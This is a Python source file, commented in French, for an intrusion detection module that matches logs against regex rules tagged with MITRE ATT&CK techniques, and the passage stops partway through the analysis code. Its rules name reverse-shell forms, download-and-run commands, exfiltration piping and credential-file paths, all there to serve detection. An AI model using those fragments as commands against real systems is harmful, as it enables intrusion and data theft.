"""
=============================================================================
 Oktopus — Module Détecteur IDS (Intrusion Detection System)
=============================================================================
 Fichier : server/detector.py
 Rôle    : Moteur de détection des menaces basé sur :
           - Règles par pattern regex (SSH brute force, SQLi, XSS, etc.)
           - Règles comportementales (seuils, horaires, ports suspects)
           - Chargement dynamique depuis config/rules.json
 
 Auteur  : Oktopus Team
 Date    : 2026-02-27
 Python  : 3.8+
=============================================================================
"""

import re
import json
import os
from datetime import datetime, timedelta
from typing import Optional, List, Dict, Any, Tuple
from collections import defaultdict


class ThreatDetector:
    """
    Moteur de détection IDS pour le SOC.
    
    Analyse chaque log normalisé et déclenche des alertes si un pattern
    malveillant ou un comportement suspect est détecté.
    
    Attributs :
        rules            : Liste des règles regex chargées
        config           : Configuration de détection
        failed_attempts  : Compteur de tentatives échouées par IP (brute force)
        ip_timestamps    : Horodatages des tentatives par IP
    """

    def __init__(self, config_path: str = None):
        """
        Initialise le moteur de détection.
        
        Args:
            config_path : Chemin vers le fichier de configuration rules.json
        """
        # --- Config par défaut ---
        self.config = {
            "brute_force_threshold": 5,
            "brute_force_window_seconds": 60,
            "suspicious_ports": [4444, 1337, 31337, 6666, 9001]
        }

        # --- Charger la config depuis le fichier si disponible ---
        if config_path and os.path.exists(config_path):
            self._load_config(config_path)
        else:
            # Chercher le fichier de config dans les emplacements standards
            possible_paths = [
                os.path.join(os.path.dirname(__file__), "..", "config", "rules.json"),
                os.path.join(os.path.dirname(__file__), "config", "rules.json"),
                "config/rules.json",
            ]
            for path in possible_paths:
                if os.path.exists(path):
                    self._load_config(path)
                    break

        # --- Compteurs pour la détection comportementale ---
        # Stocke les tentatives échouées par IP : {ip: [timestamp1, timestamp2, ...]}
        self.failed_attempts = defaultdict(list)
        
        # Compteur d'échecs par agent (pour Windows sans IP dans le message)
        self.agent_failures = defaultdict(list)
        
        # Compteur de connexions réseau par IP source (détection scan)
        self.connection_counts = defaultdict(list)

        # Compteur DDoS : connexions SYN par IP source (détection flood)
        self.syn_flood_counts = defaultdict(list)

        # Compteur de requêtes par IP (détection HTTP flood / DDoS applicatif)
        self.request_counts = defaultdict(list)

        # --- Règles de détection par pattern regex ---
        self.rules = self._build_rules()

        print(f"\033[95m[DETECTOR]\033[0m Moteur IDS initialisé — {len(self.rules)} règles chargées")

    def _load_config(self, config_path: str):
        """
        Charge la configuration depuis un fichier JSON.
        
        Args:
            config_path : Chemin vers rules.json
        """
        try:
            with open(config_path, "r", encoding="utf-8") as f:
                full_config = json.load(f)
            
            if "detection" in full_config:
                self.config.update(full_config["detection"])
            
            print(f"\033[95m[DETECTOR]\033[0m Configuration chargée depuis {config_path}")
        except (json.JSONDecodeError, IOError) as e:
            print(f"\033[91m[DETECTOR ERREUR]\033[0m Erreur chargement config : {e}")

    # =========================================================================
    #  CONSTRUCTION DES RÈGLES
    # =========================================================================

    def _build_rules(self) -> List[Dict]:
        """
        Construit la liste des règles de détection par pattern regex.
        
        Chaque règle contient :
            - name     : Nom de la règle
            - pattern  : Expression régulière compilée
            - severity : Niveau de sévérité (LOW, MEDIUM, HIGH, CRITICAL)
            - type     : Type de menace
            - description : Description de la règle
        
        Returns:
            List[Dict] : Liste des règles compilées
        """
        rules = [
            # =============================================================
            #  BRUTE FORCE — Tentatives d'authentification
            # =============================================================
            {
                "name": "SSH_BRUTE_FORCE",
                "pattern": re.compile(
                    r"failed\s+password.*ssh|failed\s+login.*ssh|"
                    r"authentication\s+failure.*ssh",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "BRUTE_FORCE",
                "description": "Tentative de brute force SSH détectée",
                "mitre_tactic": "Credential Access",
                "mitre_technique_id": "T1110",
                "mitre_technique_name": "Brute Force"
            },
            {
                "name": "SSH_INVALID_USER",
                "pattern": re.compile(
                    r"invalid\s+user.*ssh|illegal\s+user.*ssh|"
                    r"no\s+such\s+user.*ssh",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "BRUTE_FORCE",
                "description": "Tentative SSH avec utilisateur invalide",
                "mitre_tactic": "Credential Access",
                "mitre_technique_id": "T1110.001",
                "mitre_technique_name": "Brute Force: Password Guessing"
            },
            {
                "name": "WINDOWS_LOGIN_FAILURE",
                "pattern": re.compile(
                    r"failed\s+login|eventid[= ]*4625|logon\s+failure|"
                    r"échec.*connexion|échec.*ouverture.*session|"
                    r"authentication.*fail|audit\s+failure",
                    re.IGNORECASE
                ),
                "severity": "WARNING",
                "type": "BRUTE_FORCE",
                "description": "Échec de connexion Windows détecté",
                "mitre_tactic": "Credential Access",
                "mitre_technique_id": "T1110",
                "mitre_technique_name": "Brute Force"
            },
            {
                "name": "MULTIPLE_AUTH_FAILURES",
                "pattern": re.compile(
                    r"repeated\s+login\s+failures|too\s+many\s+auth|"
                    r"max.*retries|account.*locked",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "BRUTE_FORCE",
                "description": "Multiples échecs d'authentification",
                "mitre_tactic": "Credential Access",
                "mitre_technique_id": "T1110",
                "mitre_technique_name": "Brute Force"
            },

            # =============================================================
            #  INJECTION SQL
            # =============================================================
            {
                "name": "SQL_INJECTION",
                "pattern": re.compile(
                    r"union\s+(all\s+)?select|drop\s+table|"
                    r"1\s*=\s*1|or\s+1\s*=\s*1|'\s*or\s+'|"
                    r";\s*drop\s+|;\s*delete\s+|"
                    r"information_schema|load_file|into\s+outfile|"
                    r"benchmark\s*\(|sleep\s*\(",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "SQL_INJECTION",
                "description": "Tentative d'injection SQL détectée",
                "mitre_tactic": "Initial Access",
                "mitre_technique_id": "T1190",
                "mitre_technique_name": "Exploit Public-Facing Application"
            },

            # =============================================================
            #  XSS (Cross-Site Scripting)
            # =============================================================
            {
                "name": "XSS_ATTACK",
                "pattern": re.compile(
                    r"<\s*script|javascript\s*:|onerror\s*=|"
                    r"onload\s*=|onclick\s*=|onmouseover\s*=|"
                    r"eval\s*\(|document\.cookie|"
                    r"alert\s*\(|String\.fromCharCode",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "XSS",
                "description": "Tentative XSS (Cross-Site Scripting) détectée",
                "mitre_tactic": "Initial Access",
                "mitre_technique_id": "T1189",
                "mitre_technique_name": "Drive-by Compromise"
            },

            # =============================================================
            #  PATH TRAVERSAL
            # =============================================================
            {
                "name": "PATH_TRAVERSAL",
                "pattern": re.compile(
                    r"\.\./\.\./|\.\.%2[fF]|%2[eE]%2[eE]|"
                    r"/etc/passwd|/etc/shadow|"
                    r"\\\\windows\\\\system32|"
                    r"\\\\windows\\\\win\.ini",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "PATH_TRAVERSAL",
                "description": "Tentative de traversée de chemin détectée",
                "mitre_tactic": "Initial Access",
                "mitre_technique_id": "T1190",
                "mitre_technique_name": "Exploit Public-Facing Application"
            },

            # =============================================================
            #  MALWARE / Téléchargement suspect
            # =============================================================
            {
                "name": "MALWARE_DOWNLOAD",
                "pattern": re.compile(
                    r"(wget|curl).*\.(sh|exe|bat|ps1|vbs|msi).*http|"
                    r"powershell.*-enc|powershell.*downloadstring|"
                    r"certutil.*-urlcache|bitsadmin.*transfer",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "MALWARE",
                "description": "Téléchargement de malware potentiel détecté",
                "mitre_tactic": "Command and Control",
                "mitre_technique_id": "T1105",
                "mitre_technique_name": "Ingress Tool Transfer"
            },
            {
                "name": "SUSPICIOUS_PROCESS",
                "pattern": re.compile(
                    r"mimikatz|meterpreter|cobalt\s*strike|"
                    r"reverse.*shell|bind.*shell|"
                    r"nc\s+-[el]|ncat\s+-[el]|socat.*exec|"
                    r"base64\s+-d.*\|\s*(sh|bash)",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "MALWARE",
                "description": "Processus/outil malveillant détecté",
                "mitre_tactic": "Execution",
                "mitre_technique_id": "T1059",
                "mitre_technique_name": "Command and Scripting Interpreter"
            },

            # =============================================================
            #  ESCALADE DE PRIVILÈGES
            # =============================================================
            {
                "name": "PRIVILEGE_ESCALATION",
                "pattern": re.compile(
                    r"sudo.*FAILED|sudo.*incorrect|su.*FAILED|"
                    r"su.*authentication\s+failure|"
                    r"privilege.*escalat|"
                    r"setuid|chmod\s+[47][0-7]{2}|chown\s+root",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "PRIV_ESC",
                "description": "Tentative d'escalade de privilèges détectée",
                "mitre_tactic": "Privilege Escalation",
                "mitre_technique_id": "T1548",
                "mitre_technique_name": "Abuse Elevation Control Mechanism"
            },

            # =============================================================
            #  SCAN DE PORTS
            # =============================================================
            {
                "name": "PORT_SCAN",
                "pattern": re.compile(
                    r"nmap|masscan|port\s*scan|zmap|"
                    r"syn\s+scan|fin\s+scan|xmas\s+scan|"
                    r"connection\s+refused.*multiple|"
                    r"reset.*multiple\s+ports|"
                    r"SYN_SENT|CLOSE_WAIT.*multiple|"
                    r"port\s*sweep",
                    re.IGNORECASE
                ),
                "severity": "MEDIUM",
                "type": "PORT_SCAN",
                "description": "Scan de ports détecté",
                "mitre_tactic": "Discovery",
                "mitre_technique_id": "T1046",
                "mitre_technique_name": "Network Service Discovery"
            },

            # =============================================================
            #  RECONNAISSANCE / ENUMERATION
            # =============================================================
            {
                "name": "RECONNAISSANCE",
                "pattern": re.compile(
                    r"nikto|dirb|gobuster|dirsearch|"
                    r"wpscan|sqlmap|hydra|"
                    r"enum4linux|smbclient.*-L|"
                    r"ldapsearch|rpcclient",
                    re.IGNORECASE
                ),
                "severity": "MEDIUM",
                "type": "RECON",
                "description": "Outil de reconnaissance/énumération détecté",
                "mitre_tactic": "Reconnaissance",
                "mitre_technique_id": "T1595",
                "mitre_technique_name": "Active Scanning"
            },

            # =============================================================
            #  EXFILTRATION DE DONNÉES
            # =============================================================
            {
                "name": "DATA_EXFILTRATION",
                "pattern": re.compile(
                    r"scp.*external|rsync.*external|"
                    r"ftp.*upload|curl.*-T|"
                    r"base64.*\|\s*curl|"
                    r"dns.*tunnel|icmp.*tunnel",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "EXFILTRATION",
                "description": "Tentative d'exfiltration de données détectée",
                "mitre_tactic": "Exfiltration",
                "mitre_technique_id": "T1048",
                "mitre_technique_name": "Exfiltration Over Alternative Protocol"
            },

            # =============================================================
            #  EFFACEMENT DE TRACES
            # =============================================================
            {
                "name": "LOG_TAMPERING",
                "pattern": re.compile(
                    r"rm\s+.*(/var/log|\.log)|"
                    r"truncate.*log|"
                    r"shred.*log|"
                    r"history\s+-c|"
                    r"event.*1102|audit.*clear|"
                    r"wevtutil\s+cl",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "LOG_TAMPERING",
                "description": "Tentative d'effacement de logs détectée",
                "mitre_tactic": "Defense Evasion",
                "mitre_technique_id": "T1070",
                "mitre_technique_name": "Indicator Removal"
            },

            # =============================================================
            #  DDoS — Attaques par déni de service
            # =============================================================
            {
                "name": "DDOS_SYN_FLOOD",
                "pattern": re.compile(
                    r"syn\s*flood|syn_sent.*multiple|tcp.*flood|"
                    r"half.?open.*connections|backlog.*overflow|"
                    r"syn.*packets.*threshold|connection.*table.*full",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "DDOS",
                "description": "Attaque DDoS SYN Flood détectée",
                "mitre_tactic": "Impact",
                "mitre_technique_id": "T1498",
                "mitre_technique_name": "Network Denial of Service"
            },
            {
                "name": "DDOS_ICMP_FLOOD",
                "pattern": re.compile(
                    r"icmp\s*flood|ping\s*flood|smurf\s*attack|"
                    r"icmp.*rate.*exceeded|ping.*unreachable.*mass",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "DDOS",
                "description": "Attaque DDoS ICMP Flood détectée",
                "mitre_tactic": "Impact",
                "mitre_technique_id": "T1498",
                "mitre_technique_name": "Network Denial of Service"
            },
            {
                "name": "DDOS_UDP_FLOOD",
                "pattern": re.compile(
                    r"udp\s*flood|udp.*amplification|ntp.*monlist|"
                    r"dns.*amplification|memcached.*amplification|"
                    r"chargen.*attack",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "DDOS",
                "description": "Attaque DDoS UDP Flood détectée",
                "mitre_tactic": "Impact",
                "mitre_technique_id": "T1498",
                "mitre_technique_name": "Network Denial of Service"
            },
            {
                "name": "DDOS_HTTP_FLOOD",
                "pattern": re.compile(
                    r"http\s*flood|slowloris|slow.*http|"
                    r"request.*rate.*exceeded|too.*many.*requests|"
                    r"503.*service.*unavailable.*mass",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "DDOS",
                "description": "Attaque DDoS HTTP Flood détectée",
                "mitre_tactic": "Impact",
                "mitre_technique_id": "T1499",
                "mitre_technique_name": "Endpoint Denial of Service"
            },

            # =============================================================
            #  SMB EXPLOIT — EternalBlue et autres
            # =============================================================
            {
                "name": "SMB_EXPLOIT",
                "pattern": re.compile(
                    r"eternalblue|ms17[_-]010|eternal.*romance|"
                    r"eternal.*champion|smb.*exploit|smb.*remote.*code|"
                    r"doublepulsar|smb.*overflow|port\s*445.*exploit|"
                    r"trans2.*request|nt_transact",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "SMB_EXPLOIT",
                "description": "Exploit SMB (type EternalBlue) détecté",
                "mitre_tactic": "Lateral Movement",
                "mitre_technique_id": "T1210",
                "mitre_technique_name": "Exploitation of Remote Services"
            },
            {
                "name": "SMB_SUSPICIOUS",
                "pattern": re.compile(
                    r"smb.*brute|smb.*anonymous|null.*session.*smb|"
                    r"ipc\$.*anonymous|admin\$.*remote|c\$.*remote|"
                    r"smb.*relay|pass.*the.*hash.*smb",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "SMB_EXPLOIT",
                "description": "Activité SMB suspecte détectée",
                "mitre_tactic": "Lateral Movement",
                "mitre_technique_id": "T1021.002",
                "mitre_technique_name": "Remote Services: SMB/Windows Admin Shares"
            },

            # =============================================================
            #  DNS TUNNELING — Exfiltration via DNS
            # =============================================================
            {
                "name": "DNS_TUNNELING",
                "pattern": re.compile(
                    r"dns.*tunnel|dnscat|iodine.*dns|"
                    r"dns.*exfil|covert.*dns|dns.*covert|"
                    r"dns.*query.*unusual.*length|"
                    r"txt.*record.*suspicious|dns.*payload",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "DNS_TUNNEL",
                "description": "DNS Tunneling (exfiltration via DNS) détecté",
                "mitre_tactic": "Command and Control",
                "mitre_technique_id": "T1071.004",
                "mitre_technique_name": "Application Layer Protocol: DNS"
            },
            {
                "name": "DNS_SUSPICIOUS",
                "pattern": re.compile(
                    r"nslookup.*-type=txt|dig.*txt.*\+short|"
                    r"dns.*high.*frequency|dns.*rate.*anomal|"
                    r"rdns.*spam|dga.*domain|domain.*generation",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "DNS_TUNNEL",
                "description": "Activité DNS suspecte (potentiel tunneling)",
                "mitre_tactic": "Command and Control",
                "mitre_technique_id": "T1071.004",
                "mitre_technique_name": "Application Layer Protocol: DNS"
            },

            # =============================================================
            #  COMMAND & CONTROL (C2)
            # =============================================================
            {
                "name": "C2_BEACON",
                "pattern": re.compile(
                    r"c2.*beacon|command.*control.*connect|"
                    r"callback.*interval|beacon.*http|"
                    r"empire.*stager|covenant.*grunt|sliver.*implant|"
                    r"periodic.*callback|heartbeat.*suspicious",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "C2",
                "description": "Communication C2 (Command & Control) détectée",
                "mitre_tactic": "Command and Control",
                "mitre_technique_id": "T1071",
                "mitre_technique_name": "Application Layer Protocol"
            },

            # =============================================================
            #  RDP BRUTE FORCE
            # =============================================================
            {
                "name": "RDP_BRUTE_FORCE",
                "pattern": re.compile(
                    r"rdp.*failed|failed.*rdp|eventid[= ]*4625.*rdp|"
                    r"remote\s+desktop.*fail|rdp.*brute|"
                    r"mstsc.*denied|3389.*auth.*fail|"
                    r"NLA.*fail|CredSSP.*fail",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "BRUTE_FORCE",
                "description": "Tentative de brute force RDP détectée",
                "mitre_tactic": "Credential Access",
                "mitre_technique_id": "T1110",
                "mitre_technique_name": "Brute Force"
            },

            # =============================================================
            #  COMMAND INJECTION
            # =============================================================
            {
                "name": "COMMAND_INJECTION",
                "pattern": re.compile(
                    r";\s*(cat|ls|id|whoami|uname|pwd|ifconfig|ipconfig)\b|"
                    r"\|\s*(cat|ls|id|whoami|uname|pwd)\b|"
                    r"`\s*(cat|ls|id|whoami|uname|pwd)\s*`|"
                    r"\$\(\s*(cat|ls|id|whoami|uname|pwd)\s*\)|"
                    r"&&\s*(cat|ls|id|whoami|uname|pwd)\b|"
                    r"%0[aAdD]|\\r\\n.*?(cat|ls|id|whoami)",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "COMMAND_INJECTION",
                "description": "Tentative d'injection de commande OS détectée",
                "mitre_tactic": "Execution",
                "mitre_technique_id": "T1059",
                "mitre_technique_name": "Command and Scripting Interpreter"
            },

            # =============================================================
            #  LDAP INJECTION
            # =============================================================
            {
                "name": "LDAP_INJECTION",
                "pattern": re.compile(
                    r"\)\(\||\)\(\&|\*\)\(|"
                    r"objectclass\s*=\s*\*|"
                    r"uid\s*=\s*\*\)|"
                    r"\(\|\(cn=\*|"
                    r"ldap://.*\)\(|"
                    r"\\28|\\29|\\2a|\\5c",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "LDAP_INJECTION",
                "description": "Tentative d'injection LDAP détectée",
                "mitre_tactic": "Initial Access",
                "mitre_technique_id": "T1190",
                "mitre_technique_name": "Exploit Public-Facing Application"
            },

            # =============================================================
            #  XML INJECTION / XXE
            # =============================================================
            {
                "name": "XML_INJECTION_XXE",
                "pattern": re.compile(
                    r"<!ENTITY|<!DOCTYPE.*\[|SYSTEM\s+[\"']file://|"
                    r"SYSTEM\s+[\"']http://|"
                    r"php://filter|expect://|"
                    r"xmlns:xi=|xi:include|"
                    r"<!ELEMENT|SYSTEM\s+[\"']/etc/passwd",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "XXE",
                "description": "Tentative d'injection XML/XXE détectée",
                "mitre_tactic": "Initial Access",
                "mitre_technique_id": "T1190",
                "mitre_technique_name": "Exploit Public-Facing Application"
            },

            # =============================================================
            #  LOCAL FILE INCLUSION (LFI)
            # =============================================================
            {
                "name": "LFI_ATTACK",
                "pattern": re.compile(
                    r"php://filter|php://input|php://data|"
                    r"expect://|zip://|phar://|"
                    r"file=\.\./|page=\.\./|include=\.\./|"
                    r"path=\.\./|template=\.\./|"
                    r"\.\.[\\/]\.\.[\\/]\.\.[\\/]|"
                    r"/proc/self/|/dev/null|"
                    r"file=%2[eE]%2[eE]|"
                    r"c:\\\\boot\.ini|c:\\\\windows\\\\system\.ini",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "LFI",
                "description": "Tentative de Local File Inclusion (LFI) détectée",
                "mitre_tactic": "Initial Access",
                "mitre_technique_id": "T1190",
                "mitre_technique_name": "Exploit Public-Facing Application"
            },

            # =============================================================
            #  POWERSHELL ENCODED COMMANDS
            # =============================================================
            {
                "name": "POWERSHELL_ENCODED",
                "pattern": re.compile(
                    r"powershell.*-[eE]nc\s|"
                    r"powershell.*-[eE]ncodedcommand\s|"
                    r"powershell.*-[wW]indowstyle\s+hidden|"
                    r"powershell.*-[nN]op\s|"
                    r"powershell.*bypass.*-[eE]nc|"
                    r"powershell.*IEX\s*\(|"
                    r"powershell.*Invoke-Expression|"
                    r"powershell.*\[Convert\]::FromBase64|"
                    r"powershell.*Net\.WebClient",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "MALWARE",
                "description": "Commande PowerShell encodée/obfusquée détectée",
                "mitre_tactic": "Execution",
                "mitre_technique_id": "T1059.001",
                "mitre_technique_name": "PowerShell"
            },

            # =============================================================
            #  SUSPICIOUS SCRIPT EXECUTION
            # =============================================================
            {
                "name": "SUSPICIOUS_SCRIPT",
                "pattern": re.compile(
                    r"cscript.*\.vbs|wscript.*\.vbs|"
                    r"mshta\s|mshta\.exe|"
                    r"regsvr32\s.*/s.*http|"
                    r"rundll32.*javascript|"
                    r"certutil.*-decode|certutil.*-encode|"
                    r"bitsadmin.*/transfer|"
                    r"wmic.*process.*call.*create|"
                    r"schtasks.*/create.*cmd|"
                    r"InstallUtil.*\.exe|MSBuild.*\.exe",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "MALWARE",
                "description": "Exécution de script suspect (LOLBins/LOLBAS) détectée",
                "mitre_tactic": "Execution",
                "mitre_technique_id": "T1059",
                "mitre_technique_name": "Command and Scripting Interpreter"
            },

            # =============================================================
            #  WINDOWS PRIVILEGE ESCALATION
            # =============================================================
            {
                "name": "WINDOWS_PRIV_ESC",
                "pattern": re.compile(
                    r"runas\s.*/user|"
                    r"eventid[= ]*4672|"
                    r"eventid[= ]*4673|"
                    r"eventid[= ]*4674|"
                    r"SeDebugPrivilege|SeTakeOwnershipPrivilege|"
                    r"SeLoadDriverPrivilege|SeBackupPrivilege|"
                    r"potato\.exe|juicypotato|sweetpotato|"
                    r"printspoofer|godpotato",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "PRIV_ESC",
                "description": "Escalade de privilèges Windows détectée",
                "mitre_tactic": "Privilege Escalation",
                "mitre_technique_id": "T1548",
                "mitre_technique_name": "Abuse Elevation Control Mechanism"
            },

            # =============================================================
            #  TOKEN MANIPULATION
            # =============================================================
            {
                "name": "TOKEN_MANIPULATION",
                "pattern": re.compile(
                    r"token.*impersonat|impersonat.*token|"
                    r"eventid[= ]*4624.*type\s*=?\s*9|"
                    r"incognito|token.*steal|"
                    r"logon\s*type.*9|"
                    r"pass.?the.?token|golden.?ticket|silver.?ticket|"
                    r"kerberoast|asreproast",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "PRIV_ESC",
                "description": "Manipulation de token / attaque Kerberos détectée",
                "mitre_tactic": "Defense Evasion",
                "mitre_technique_id": "T1134",
                "mitre_technique_name": "Access Token Manipulation"
            },

            # =============================================================
            #  NETWORK ENUMERATION
            # =============================================================
            {
                "name": "NETWORK_ENUMERATION",
                "pattern": re.compile(
                    r"net\s+view|net\s+share|net\s+user\s|net\s+group\s|"
                    r"net\s+localgroup|net\s+accounts|"
                    r"arp\s+-a|nbtscan|"
                    r"ping\s+-[cnt]\s*\d+.*-[cnt]|"
                    r"bloodhound|sharphound|"
                    r"crackmapexec|evil-?winrm|"
                    r"nbtstat\s+-[aA]|nltest.*domain",
                    re.IGNORECASE
                ),
                "severity": "MEDIUM",
                "type": "RECON",
                "description": "Énumération réseau/domaine détectée",
                "mitre_tactic": "Discovery",
                "mitre_technique_id": "T1046",
                "mitre_technique_name": "Network Service Discovery"
            },

            # =============================================================
            #  LATERAL MOVEMENT
            # =============================================================
            {
                "name": "LATERAL_MOVEMENT",
                "pattern": re.compile(
                    r"psexec|paexec|"
                    r"wmi.*remote|wmic.*/node:|"
                    r"winrm.*invoke|"
                    r"eventid[= ]*4648|"
                    r"pass.?the.?hash|pth.*attack|"
                    r"remote.*service.*create|"
                    r"smbexec|atexec|dcomexec|"
                    r"enter-?pssession|invoke-?command.*-computer",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "LATERAL_MOVEMENT",
                "description": "Mouvement latéral détecté",
                "mitre_tactic": "Lateral Movement",
                "mitre_technique_id": "T1021",
                "mitre_technique_name": "Remote Services"
            },

            # =============================================================
            #  PERSISTENCE (Scheduled Tasks, Services, Startup)
            # =============================================================
            {
                "name": "PERSISTENCE",
                "pattern": re.compile(
                    r"schtasks.*/create|at\s+\d+:\d+|"
                    r"sc\s+create|sc\s+config.*start=\s*auto|"
                    r"eventid[= ]*7045|"
                    r"crontab\s+-[ei]|"
                    r"/etc/cron\.|systemctl\s+enable|"
                    r"\.bashrc.*curl|\.profile.*wget|"
                    r"startup.*folder.*copy|"
                    r"HKLM.*Run.*reg\s+add",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "PERSISTENCE",
                "description": "Mécanisme de persistance détecté",
                "mitre_tactic": "Persistence",
                "mitre_technique_id": "T1053",
                "mitre_technique_name": "Scheduled Task/Job"
            },

            # =============================================================
            #  REGISTRY PERSISTENCE (Windows)
            # =============================================================
            {
                "name": "REGISTRY_PERSISTENCE",
                "pattern": re.compile(
                    r"reg\s+add.*CurrentVersion\\\\Run|"
                    r"reg\s+add.*Winlogon|"
                    r"reg\s+add.*Image\s*File\s*Execution|"
                    r"reg\s+add.*AppInit_DLLs|"
                    r"reg\s+add.*Shell\\\\Open|"
                    r"eventid[= ]*4657.*Run|"
                    r"HKCU.*Software.*Microsoft.*Run",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "PERSISTENCE",
                "description": "Persistance via registre Windows détectée",
                "mitre_tactic": "Persistence",
                "mitre_technique_id": "T1547.001",
                "mitre_technique_name": "Boot or Logon Autostart Execution: Registry Run Keys"
            },

            # =============================================================
            #  REVERSE SHELL
            # =============================================================
            {
                "name": "REVERSE_SHELL",
                "pattern": re.compile(
                    r"bash\s+-i\s+>&\s*/dev/tcp|"
                    r"nc\s+-e\s*/bin/(sh|bash)|"
                    r"ncat\s+-e\s*/bin/(sh|bash)|"
                    r"python.*socket.*connect.*subprocess|"
                    r"php\s+-r.*fsockopen|"
                    r"ruby.*TCPSocket.*exec|"
                    r"perl.*socket.*exec|"
                    r"socat.*exec.*pty|"
                    r"mkfifo.*/tmp/.*nc\s|"
                    r"powershell.*TCPClient.*Stream",
                    re.IGNORECASE
                ),
                "severity": "CRITICAL",
                "type": "REVERSE_SHELL",
                "description": "Reverse shell détecté",
                "mitre_tactic": "Execution",
                "mitre_technique_id": "T1059",
                "mitre_technique_name": "Command and Scripting Interpreter"
            },

            # =============================================================
            #  TOR / ANONYMIZATION
            # =============================================================
            {
                "name": "TOR_CONNECTION",
                "pattern": re.compile(
                    r"tor\s+browser|tor\.exe|"
                    r"\.onion\b|"
                    r"socks.*127\.0\.0\.1.*9050|"
                    r"socks.*localhost.*9050|"
                    r"torrc|"
                    r"obfs4proxy|obfsproxy|"
                    r"meek-?client|snowflake-?client|"
                    r"SOCKS5.*9050",
                    re.IGNORECASE
                ),
                "severity": "HIGH",
                "type": "TOR",
                "description": "Connexion Tor / anonymisation détectée",
                "mitre_tactic": "Command and Control",
                "mitre_technique_id": "T1090.003",
                "mitre_technique_name": "Proxy: Multi-hop Proxy"
            },

            # =============================================================
            #  VPN SUSPICIOUS
            # =============================================================
            {
                "name": "VPN_SUSPICIOUS",
                "pattern": re.compile(
                    r"openvpn.*unauthorized|vpn.*tunnel.*unknown|"
                    r"wireguard.*unauthorized|"
                    r"ipsec.*fail|ikev2.*fail|"
                    r"vpn.*brute|vpn.*invalid.*credential|"
                    r"l2tp.*denied|pptp.*denied|"
                    r"unauthorized.*vpn.*client",
                    re.IGNORECASE
                ),
                "severity": "MEDIUM",
                "type": "VPN_SUSPICIOUS",
                "description": "Activité VPN suspecte détectée",
                "mitre_tactic": "Persistence",
                "mitre_technique_id": "T1133",
                "mitre_technique_name": "External Remote Services"
            },
        ]

        return rules

    # =========================================================================
    #  ANALYSE PRINCIPALE
    # =========================================================================

    def analyze(self, log: Dict) -> List[Dict]:
        """
        Analyse un log normalisé et retourne les alertes déclenchées.
        
        Effectue 3 niveaux d'analyse :
        1. Règles regex (patterns malveillants dans le message)
        2. Analyse comportementale (brute force IP, seuils)
        3. Analyse contextuelle (ports suspects, horaires)
        
        Args:
            log : Dict normalisé contenant au minimum :
                  - message, agent_id, agent_ip, timestamp, level, category
        
        Returns:
            List[Dict] : Liste des alertes générées (peut être vide)
                         Chaque alerte contient :
                         - rule_name, severity, type, message, timestamp, agent_id
        """
        alerts = []
        message = log.get("message", "")
        agent_id = log.get("agent_id", "unknown")
        timestamp = log.get("timestamp", datetime.now().isoformat())

        if not message:
            return alerts

        # --- 1. Analyse par patterns regex ---
        pattern_alerts = self._check_pattern_rules(message, agent_id, timestamp)
        alerts.extend(pattern_alerts)

        # --- 2. Analyse comportementale (brute force par IP) ---
        behavioral_alerts = self._check_behavioral_rules(log)
        alerts.extend(behavioral_alerts)

        # --- 3. Analyse contextuelle (ports, horaires) ---
        context_alerts = self._check_context_rules(log)
        alerts.extend(context_alerts)

        # Afficher les alertes dans le terminal
        for alert in alerts:
            severity = alert["severity"]
            if severity == "CRITICAL":
                color = "\033[91m"  # Rouge
            elif severity == "HIGH":
                color = "\033[93m"  # Jaune
            elif severity == "MEDIUM":
                color = "\033[33m"  # Orange
            else:
                color = "\033[37m"  # Gris
            
            print(f"{color}[ALERT {severity}]\033[0m "
                  f"[{alert['rule_name']}] "
                  f"Agent: {agent_id} — {alert['message'][:80]}")

        return alerts

    # =========================================================================
    #  DÉTECTION PAR PATTERNS REGEX
    # =========================================================================

    def _check_pattern_rules(self, message: str, agent_id: str,
                              timestamp: str) -> List[Dict]:
        """
        Vérifie le message contre toutes les règles regex.
        
        Args:
            message   : Message du log à analyser
            agent_id  : ID de l'agent
            timestamp : Horodatage du log
        
        Returns:
            List[Dict] : Alertes déclenchées
        """
        alerts = []

        for rule in self.rules:
            if rule["pattern"].search(message):
                alert = {
                    "rule_name": rule["name"],
                    "severity": rule["severity"],
                    "type": rule["type"],
                    "message": f"{rule['description']} | Message: {message[:200]}",
                    "timestamp": timestamp,
                    "agent_id": agent_id,
                    "mitre_tactic": rule.get("mitre_tactic", ""),
                    "mitre_technique_id": rule.get("mitre_technique_id", ""),
